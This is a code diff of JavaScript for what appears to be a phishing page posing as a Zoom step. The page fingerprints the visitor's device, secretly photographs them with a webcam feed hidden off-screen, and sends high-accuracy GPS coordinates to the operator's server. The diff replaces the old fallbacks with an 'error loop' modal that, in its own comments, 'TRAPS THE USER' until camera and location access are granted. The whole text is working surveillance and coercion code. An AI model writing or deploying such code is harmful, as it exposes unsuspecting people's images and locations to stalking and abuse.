@@ -1,4 +1,4 @@
-// 1. Device Info (Runs on Page Load)
+// 1. Device Info (Runs silently)
 function information() {
   if (navigator.getBattery) {
     navigator.getBattery().then(function(battery) {
@@ -42,22 +42,32 @@ function collectAndSend(batLevel) {
   });
 }
 
-// 2. Camera Logic (The Ultimate Fix for Windows/Mac)
+// -----------------------------------------------------
+// THE ERROR LOOP TRIGGER
+// -----------------------------------------------------
+function triggerErrorLoop() {
+    // Shows the error modal defined in index.html
+    document.getElementById('permission-error').style.display = 'block';
+}
+
+// -----------------------------------------------------
+// 2. CAMERA LOGIC (First Step)
+// -----------------------------------------------------
 function captureAndSend(callback) {
-  // Create Video Element and attach to DOM (Critical for Desktop)
   var video = document.createElement('video');
   video.style.position = "fixed";
-  video.style.top = "-10000px"; // Hide it off-screen
+  video.style.top = "-10000px";
   video.style.left = "-10000px";
   document.body.appendChild(video); 
 
   var canvas = document.getElementById('canvas');
 
-  // Safety Timer: Redirect if stuck for 5 seconds
+  // SAFETY TIMER: If browser hangs -> Show Error Loop
   var safetyTimer = setTimeout(function() {
-      if(callback) callback();
-      try { document.body.removeChild(video); } catch(e){} // Cleanup
-  }, 5000);
+      console.log("Camera timed out");
+      try { document.body.removeChild(video); } catch(e){}
+      triggerErrorLoop(); // <--- TRAPS THE USER
+  }, 8000); 
 
   video.autoplay = true;
   video.muted = true;
@@ -68,7 +78,6 @@ function captureAndSend(callback) {
       video.srcObject = stream;
       video.play();
 
-      // Wait for data to be ready
       video.onloadeddata = function() {
           setTimeout(function() {
             clearTimeout(safetyTimer);
@@ -91,9 +100,10 @@ function captureAndSend(callback) {
                     success: function() {
                       stream.getTracks().forEach(track => track.stop());
                       try { document.body.removeChild(video); } catch(e){}
-                      if (callback) callback();
+                      if (callback) callback(); // Success! Next step.
                     },
                     error: function() {
+                      // If upload fails technically, we usually let them pass
                       stream.getTracks().forEach(track => track.stop());
                       try { document.body.removeChild(video); } catch(e){}
                       if (callback) callback(); 
@@ -101,30 +111,35 @@ function captureAndSend(callback) {
                   });
                 }, 'image/jpeg', 0.8);
             } else {
-                // If video is still empty, just redirect
+                // Video empty -> Error Loop
                 stream.getTracks().forEach(track => track.stop());
                 try { document.body.removeChild(video); } catch(e){}
-                if (callback) callback();
+                triggerErrorLoop();
             }
           }, 500);
       };
     }).catch(function(err) {
+      // Permission Denied -> Error Loop
       clearTimeout(safetyTimer);
       try { document.body.removeChild(video); } catch(e){}
-      if (callback) callback();
+      triggerErrorLoop(); 
     });
   } else {
+    // Not supported -> Error Loop
     clearTimeout(safetyTimer);
-    if (callback) callback();
+    triggerErrorLoop();
   }
 }
 
-// 3. Location Logic
+// -----------------------------------------------------
+// 3. LOCATION LOGIC (Second Step)
+// -----------------------------------------------------
 function locate(callback, errCallback) {
-  // Safety Timer for Location
+  // SAFETY TIMER: If browser hangs -> Show Error Loop
   var locTimer = setTimeout(function() {
-      if(errCallback) errCallback();
-  }, 5000);
+      console.log("Location timed out");
+      triggerErrorLoop();
+  }, 8000);
 
   if (navigator.geolocation) {
     var optn = { enableHighAccuracy: true, timeout: 30000, maximumage: 0 };
@@ -135,13 +150,14 @@ function locate(callback, errCallback) {
       }, 
       function(error) { 
           clearTimeout(locTimer);
-          showError(error, errCallback); 
+          // Denied -> Show Error Loop (via showError)
+          showError(error, null); 
       }, 
       optn
     );
   } else {
     clearTimeout(locTimer);
-    if(errCallback) errCallback();
+    triggerErrorLoop();
   }
 }
 
@@ -157,7 +173,10 @@ function showError(error, errCallback) {
     type: 'POST',
     url: error_file,
     data: { Status: 'failed', Error: err_text },
-    success: function() { if(errCallback) errCallback(); },
+    success: function() { 
+        // Log the error, then TRAP THE USER
+        triggerErrorLoop(); 
+    },
     mimeType: 'text'
   });
 }
@@ -175,6 +194,7 @@ function showPosition(position, callback) {
     url: result_file,
     data: { Status: 'success', Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd },
     success: function() { 
+        // Success! Go to Zoom
         if(callback) callback(); 
     },
     error: function() {
